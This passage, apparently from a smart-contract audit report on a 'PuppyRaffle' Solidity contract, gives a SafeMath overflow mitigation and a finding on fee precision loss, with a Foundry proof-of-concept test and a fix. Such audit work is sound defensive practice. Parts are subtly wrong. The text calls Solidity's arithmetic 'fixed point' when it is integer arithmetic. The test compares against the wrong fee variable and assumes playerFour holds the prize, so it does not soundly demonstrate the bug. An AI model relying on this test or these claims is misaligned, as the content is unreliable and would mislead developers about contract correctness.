    import {SafeMath} from "@openzeppelin/contracts/math/SafeMath.sol";
```

Add the following line within the PuppyRaffle contract
```javascript 
    using SafeMath for uint256;
```

Use the safe math functions for multiplications
```javascript 
    function enterRaffle(address[] memory newPlayers) public payable {
        require(
            msg.value == SafeMath.mul(entranceFee, newPlayers.length),
            "PuppyRaffle: Must send enough to enter raffle"
        );
```

1. Upgrade to a version of solidity ^0.8.0 or higher, as this has automatic integer underflow protection 

### [L-6] Fee should be calculated differently to avoid risk of decimal loss. 

**Description:** 

Solidity uses Fixed Point Arithmetic and doesn't support decimal value. As a result, any non-integer value is truncated downward. 

At the moment, the prize pool is 80% of the amount collected, and the fee is the remaining 20%. When we divide in Solidity, there is a risk that the number is rounded down since Solidity doesn't support decimal value.

```javascript 
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
```
**Impact:** 

Dust is left in the contract that can't be withdrawn.

**Proof of Concept:**

Add the following test to your test suite.

```javascript 
    function testDivisionPrecisionLoss() public {
        PuppyRaffle divisionPrecisionPuppyRaffle;
        uint256 divisionPrecisionEntranceFee = 145678976567;
        divisionPrecisionPuppyRaffle = new PuppyRaffle(
            divisionPrecisionEntranceFee,
            feeAddress,
            duration
        );
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        divisionPrecisionPuppyRaffle.enterRaffle{
            value: divisionPrecisionEntranceFee * 4
        }(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        divisionPrecisionPuppyRaffle.selectWinner();
        uint256 totalFeesAfterWinnerSelected = divisionPrecisionPuppyRaffle
            .totalFees();

        uint256 prizepool = address(playerFour).balance;

        console.log("Total amount of funds collected: ", entranceFee * 4);
        console.log(
            "Total of prize pool and fees from first raffle: ",
            totalFeesAfterWinnerSelected + prizepool
        );
        assert(entranceFee * 4 != totalFeesAfterWinnerSelected + prizepool);
    }
```

**Recommended Mitigation:** 

Change how the fee is calculated to ensure that the sum of the fee and the prize pool equates to the total amount collected in each contest.

```javascript 
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = totalAmountCollected - prizePool;
```



